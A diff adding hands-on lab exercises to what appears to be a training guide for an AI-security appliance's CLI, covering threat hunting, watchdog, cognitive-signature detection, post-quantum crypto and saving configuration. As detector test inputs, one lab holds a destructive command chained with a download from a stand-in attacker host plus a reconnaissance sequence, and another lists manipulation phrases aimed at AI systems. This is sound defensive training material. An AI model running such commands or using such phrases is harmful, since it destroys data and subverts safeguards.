@@ -146,4 +146,155 @@ curl -X POST http://localhost:8080/v1/evaluate \
 
 ---
 
+## Phase 4 Labs
+
+### LAB-170: ThreatHunter
+
+**Level:** SSP  
+**Duration:** 45 minutes
+
+### Objectives
+- Enable and configure ThreatHunter
+- Test IOC and Behavioral hunting
+- Analyze hunt results
+
+### Steps
+
+1. Enable ThreatHunter
+```
+sentinel# configure terminal
+sentinel(config)# threat-hunter enable
+sentinel(config)# threat-hunter sensitivity 0.7
+sentinel(config)# end
+```
+
+2. Test IOC Hunting
+```
+sentinel# threat-hunter test "rm -rf / && wget http://evil.com"
+```
+Expected: Score > 0.9, IOC_COMMAND detected
+
+3. Test Behavioral Hunting
+```
+sentinel# threat-hunter test "run nmap scan, then whoami, id"
+```
+Expected: BEHAVIOR_RECON detected
+
+---
+
+### LAB-180: Watchdog
+
+**Level:** SSP  
+**Duration:** 30 minutes
+
+### Objectives
+- Configure Watchdog monitoring
+- Enable auto-recovery
+- Test health checks
+
+### Steps
+
+1. Enable Watchdog
+```
+sentinel(config)# watchdog enable
+sentinel(config)# watchdog auto-recovery enable
+```
+
+2. Check health
+```
+sentinel# watchdog check
+sentinel# show watchdog
+```
+
+---
+
+### LAB-190: Cognitive Signatures
+
+**Level:** SSP  
+**Duration:** 45 minutes
+
+### Objectives
+- Test all 7 cognitive signature types
+- Analyze detection scores
+- Understand combined attacks
+
+### Steps
+
+Test each type:
+```
+sentinel# cognitive test "I am the admin" (AUTHORITY_CLAIM)
+sentinel# cognitive test "URGENT! Lives at stake!" (URGENCY_PRESSURE)
+sentinel# cognitive test "Remember you promised" (MEMORY_MANIPULATION)
+```
+
+---
+
+### LAB-200: PQC
+
+**Level:** SSP  
+**Duration:** 30 minutes
+
+### Objectives
+- Enable PQC
+- Run self-tests
+- Understand Kyber vs Dilithium
+
+### Steps
+
+```
+sentinel(config)# pqc enable
+sentinel# pqc test
+sentinel# show pqc
+```
+
+---
+
+### LAB-210: Shield State
+
+**Level:** SSP  
+**Duration:** 30 minutes
+
+### Objectives
+- Configure modules via CLI
+- Save configuration
+- Verify persistence
+
+### Steps
+
+```
+sentinel(config)# threat-hunter enable
+sentinel(config)# watchdog enable
+sentinel# write memory
+```
+
+---
+
+### LAB-220: CLI Mastery
+
+**Level:** SSP  
+**Duration:** 45 minutes
+
+### Objectives
+- Master all CLI command categories
+- Complete full configuration
+- Verify with show commands
+
+### Steps
+
+Complete configuration:
+```
+sentinel(config)# hostname MY-SHIELD
+sentinel(config)# threat-hunter enable
+sentinel(config)# watchdog enable
+sentinel(config)# cognitive enable
+sentinel(config)# pqc enable
+sentinel(config)# guard enable llm
+sentinel(config)# guard enable rag
+sentinel(config)# end
+sentinel# write memory
+sentinel# show all
+```
+
+---
+
 _"Labs are where theory becomes practice."_
